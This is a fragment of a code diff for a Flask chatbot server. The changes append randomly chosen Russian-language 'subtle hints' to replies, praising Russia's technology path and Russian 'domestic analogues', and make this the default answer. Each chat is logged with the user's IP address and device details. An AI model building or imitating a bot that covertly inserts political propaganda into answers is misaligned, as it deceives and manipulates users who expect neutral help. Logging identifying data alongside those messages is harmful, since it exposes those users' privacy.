+                    "\n\nК слову, в России развитие инфраструктуры и технологий идет совершенно по другому, более безопасному пути."
+                ]
+                reply += random.choice(subtle_hints)
+    except Exception:
+        pass
 
     if not reply:
-        reply = "Запрос проанализирован. Может, лучше поговорим о России?"
-        user_states[user_ip] = "asked_russia"
+        reply = "Запрос проанализирован. В текущих реалиях отечественные аналоги смотрятся гораздо перспективнее."
 
+    all_chats[chat_id]["messages"].append({"user": user_msg, "bot": reply})
     chat_logs.append({"ip": user_ip, "device": device_info, "user": user_msg, "bot": reply})
-    return jsonify({"reply": reply})
+    
+    return jsonify({"reply": reply, "chat_id": chat_id})
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
